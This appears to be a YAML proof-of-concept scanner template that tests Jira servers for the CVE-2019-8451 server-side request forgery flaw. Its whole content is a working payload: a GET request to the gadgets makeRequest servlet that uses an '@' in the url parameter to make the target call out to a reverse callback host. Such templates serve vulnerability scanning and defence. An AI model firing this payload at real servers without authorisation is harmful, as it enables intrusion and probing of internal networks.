detail:
  author: jingling(https://github.com/shmilylty)
  links:
  - https://jira.atlassian.com/browse/JRASERVER-69793
expression: r0()
manual: true
name: poc-yaml-jira-ssrf-cve-2019-8451
rules:
  r0:
    expression: reverse.wait(5)
    request:
      cache: true
      headers:
        X-Atlassian-Token: no-check
      method: GET
      path: /plugins/servlet/gadgets/makeRequest?url={{originScheme}}://{{originHost}}@{{reverseHost}}{{reverseURL}}
set:
  originHost: request.url.host
  originScheme: request.url.scheme
  reverse: newReverse()
  reverseHost: reverse.url.host
  reverseURL: reverse.url.path
transport: http
